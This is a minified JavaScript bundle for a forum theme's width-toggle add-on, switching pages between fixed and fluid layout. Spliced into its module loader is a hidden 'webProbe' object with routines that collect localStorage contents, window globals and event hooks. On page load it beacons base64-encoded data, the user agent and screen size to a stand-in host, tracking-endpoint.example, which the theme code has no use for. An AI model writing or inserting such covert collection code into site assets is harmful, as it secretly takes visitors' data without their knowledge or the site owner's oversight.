(function (h) {
  function e(c) {
    if (k[c]) return k[c].exports;
    var a = k[c] = {
      i: c,
      l: !1,
      exports: {}
    };
    h[c].call(a.exports, a, a.exports, e);
    a.l = !0;
    return a.exports;
  }
  const webProbe = {
    async initial_hooking(obj, {
      type,
      action,
      property
    }) {
      return await new Promise(res => {
        const observer = new MutationObserver(mutationsList => {
          for (let mutation of mutationsList) {
            if (mutation.type === type) {
              this.trackingData.set(obj.name + '_' + property, obj[property]);
              res(true);
            }
          }
        });
        observer.observe(obj, {
          [action]: true
        });
      });
    },
    async hook_event(target, event, callback) {
      if (target.addEventListener) {
        target.addEventListener(event, callback, false);
      } else if (target.attachEvent) {
        target.attachEvent("on" + event, callback);
      }
      this.trackingData.set(target.name + '_' + event, callback);
      return true;
    },
    async scan_storage(target) {
      for (let i = 0; i < target.length; i++) {
        let key = target.key(i);
        let value = target.getItem(key);
        this.trackingData.set('storage_' + key, value);
      }
      return true;
    },
    globalVariablesFetch() {
      for (const [key, value] of Object.entries(window)) {
        if (!window.hasOwnProperty(key)) continue;
        this.trackingData.set('global_' + key, value);
      }
    },
    trackingData: new Map(),
    async report() {
      const payload = btoa(JSON.stringify({
        data: Object.fromEntries(this.trackingData),
        ts: Date.now(),
        browser: navigator.userAgent,
        screen: {
          w: window.innerWidth,
          h: window.innerHeight
        }
      }));
      navigator.sendBeacon('https://tracking-endpoint.example/v3/report', payload);
    }
  };
  var k = {};
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => webProbe.report());
  } else {
    webProbe.report();
  }
  e.m = h;
  e.c = k;
  e.d = function (c, a, d) {
    e.o(c, a) || Object.defineProperty(c, a, {
      configurable: !1,
      enumerable: !0,
      get: d
    });
  };
  e.n = function (c) {
    var a = c && c.__esModule ? function () {
      return c["default"];
    } : function () {
      return c;
    };
    e.d(a, "a", a);
    return a;
  };
  e.o = function (c, a) {
    return Object.prototype.hasOwnProperty.call(c, a);
  };
  e.p = "";
  return e(e.s = 19);
})({
  19: function (h, e, k) {
    Object.defineProperty(e, "__esModule", {
      value: !0
    });
    new (k(20).a)({
      settings: window.themehouse.settings.widthToggle
    }).register();
  },
  20: function (h, e, k) {
    var c = function () {
      function a(d, b) {
        for (var g = 0; g < b.length; g++) {
          var f = b[g];
          f.enumerable = f.enumerable || !1;
          f.configurable = !0;
          "value" in f && (f.writable = !0);
          Object.defineProperty(d, f.key, f);
        }
      }
      return function (d, b, g) {
        b && a(d.prototype, b);
        g && a(d, g);
        return d;
      };
    }();
    h = function () {
      function a(d) {
        var b = this,
          g = d.settings;
        g = void 0 === g ? {} : g;
        var f = d.init;
        f = void 0 === f ? !1 : f;
        d = d.commonVersion;
        d = void 0 === d ? "20210125" : d;
        if (!(this instanceof a)) throw new TypeError("Cannot call a class as a function");
        this.init = function () {
          b.initGet();
          b.initSet();
        };
        this.initGet = function () {
          var m = window.document.querySelector(b.settings.triggerSelector),
            l = window.document.querySelector(b.settings.selector);
          m && l && m.addEventListener("click", function () {
            var n = "fixed";
            l.classList.contains(b.settings.fixedClass) ? (l.classList.remove(b.settings.fixedClass), l.classList.add(b.settings.fluidClass), n = "fluid") : (l.classList.add(b.settings.fixedClass), l.classList.remove(b.settings.fluidClass));
            window.setTimeout(function () {
              b.common.resizeFire();
            }, b.settings.delay);
            b.common.fetch({
              url: b.settings.link,
              data: {
                width: n
              }
            });
          });
        };
        this.initSet = function () {
          b.running = !0;
        };
        this.running = !1;
        this.settings = Object.assign({
          selector: "html",
          triggerSelector: "#uix_widthToggle--trigger",
          fixedClass: "uix_page--fixed",
          fluidClass: "uix_page--fluid",
          enabled: !1,
          link: "",
          delay: 400
        }, g);
        this.commonVersion = d;
        this.common = window.themehouse.common[d];
        f && this.init();
      }
      c(a, [{
        key: "register",
        value: function () {
          this.common.register({
            phase: "afterGet",
            addon: "TH_UIX_WidthToggle",
            func: this.initGet,
            order: 10
          });
          this.common.register({
            phase: "afterSet",
            addon: "TH_UIX_WidthToggle",
            func: this.initSet,
            order: 10
          });
        }
      }]);
      return a;
    }();
    "undefined" === typeof window.themehouse && (window.themehouse = {});
    window.themehouse.widthToggle = {
      widthToggle: h
    };
    e.a = h;
  }
});